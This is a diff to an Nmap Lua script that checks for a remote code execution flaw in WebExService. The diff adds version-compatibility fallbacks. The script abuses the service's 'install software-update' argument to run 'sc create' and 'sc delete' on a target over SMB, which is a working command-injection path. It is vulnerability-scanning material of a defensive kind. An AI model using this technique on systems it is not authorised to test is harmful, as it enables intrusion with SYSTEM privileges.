@@ -1,11 +1,14 @@
 local msrpc = require "msrpc"
-local rand = require "rand"
 local string = require "string"
 local shortport = require "shortport"
 local smb = require "smb"
 local stdnse = require "stdnse"
 local vulns = require "vulns"
-local stringaux = require "stringaux"
+-- compat stuff for Nmap 7.70 and earlier
+local have_rand, rand = pcall(require, "rand")
+local random_string = have_rand and rand.random_string or stdnse.generate_random_string
+local have_stringaux, stringaux = pcall(require, "stringaux")
+local strsplit = (have_stringaux and stringaux or stdnse).strsplit
 
 description = [[
 Checks whether the WebExService is installed and allows us to run code.
@@ -49,7 +52,7 @@ action = function(host, port)
   local close_result
   local bind_result
   local result
-  local test_service = rand.random_string(16, "0123456789abcdefghijklmnoprstuvzxwyABCDEFGHIJKLMNOPRSTUVZXWY")
+  local test_service = random_string(16, "0123456789abcdefghijklmnoprstuvzxwyABCDEFGHIJKLMNOPRSTUVZXWY")
 
   local vuln = {
     title = "Remote Code Execution vulnerability in WebExService",
@@ -118,7 +121,7 @@ action = function(host, port)
   -- Create a test service that we can query
   local webexec_command = "sc create " .. test_service .. " binpath= c:\\fakepath.exe"
   stdnse.debug1("Creating a test service: " .. webexec_command)
-  status, result = msrpc.svcctl_startservicew(smbstate, open_service_result['handle'], stringaux.strsplit(" ", "install software-update 1 " .. webexec_command))
+  status, result = msrpc.svcctl_startservicew(smbstate, open_service_result['handle'], strsplit(" ", "install software-update 1 " .. webexec_command))
   if not status then
     vuln.check_results = "Could not start WebExService"
     return report:make_output(vuln)
@@ -154,7 +157,7 @@ action = function(host, port)
   -- Delete the service and clean up (ignore the return values because there's nothing more that we can really do)
   webexec_command = "sc delete " .. test_service .. ""
   stdnse.debug1("Cleaning up the test service: " .. webexec_command)
-  status, result = msrpc.svcctl_startservicew(smbstate, open_service_result['handle'], stringaux.strsplit(" ", "install software-update 1 " .. webexec_command))
+  status, result = msrpc.svcctl_startservicew(smbstate, open_service_result['handle'], strsplit(" ", "install software-update 1 " .. webexec_command))
   msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])
   smb.stop(smbstate)
 
